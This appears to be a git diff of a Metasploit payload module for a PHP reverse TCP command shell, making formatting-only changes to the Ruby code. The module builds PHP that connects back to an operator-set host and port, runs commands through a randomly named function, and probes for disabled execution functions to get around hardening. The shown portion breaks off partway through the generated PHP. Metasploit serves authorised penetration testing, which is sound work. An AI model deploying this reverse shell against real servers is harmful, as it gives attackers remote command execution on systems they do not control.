@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -13,22 +11,24 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
-      'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
-      'Author'        => 'egypt',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'php',
-      'Arch'          => ARCH_PHP,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+    super(
+      merge_info(
+        info,
+        'Name' => 'PHP Command Shell, Reverse TCP (via PHP)',
+        'Description' => 'Reverse PHP connect back shell with checks for disabled functions',
+        'Author' => 'egypt',
+        'License' => BSD_LICENSE,
+        'Platform' => 'php',
+        'Arch' => ARCH_PHP,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
@@ -39,8 +39,7 @@ module MetasploitModule
   #      circumvent safe mode.
   #
   def php_reverse_shell
-
-    if (!datastore['LHOST'] or datastore['LHOST'].empty?)
+    if !datastore['LHOST'] || datastore['LHOST'].empty?
       # datastore is empty on msfconsole startup
       ipaddr = '127.0.0.1'
       port = 4444
@@ -48,25 +47,25 @@ module MetasploitModule
       ipaddr = datastore['LHOST']
       port = datastore['LPORT']
     end
-    exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)
+    exec_funcname = Rex::Text.rand_text_alpha(5..14)
 
     uri = "tcp://#{ipaddr}"
-    socket_family = "AF_INET"
+    socket_family = 'AF_INET'
 
     if Rex::Socket.is_ipv6?(ipaddr)
       uri = "tcp://[#{ipaddr}]"
-      socket_family = "AF_INET6"
+      socket_family = 'AF_INET6'
     end
 
-    shell=<<-END_OF_PHP_CODE
-    #{php_preamble(disabled_varname: "$dis")}
+    shell = <<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: '$dis')}
     $ipaddr='#{ipaddr}';
     $port=#{port};
 
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
         global $dis;
-        #{php_system_block(cmd_varname: "$c", disabled_varname: "$dis", output_varname: "$o")}
+        #{php_system_block(cmd_varname: '$c', disabled_varname: '$dis', output_varname: '$o')}
         return $o;
       }
     }
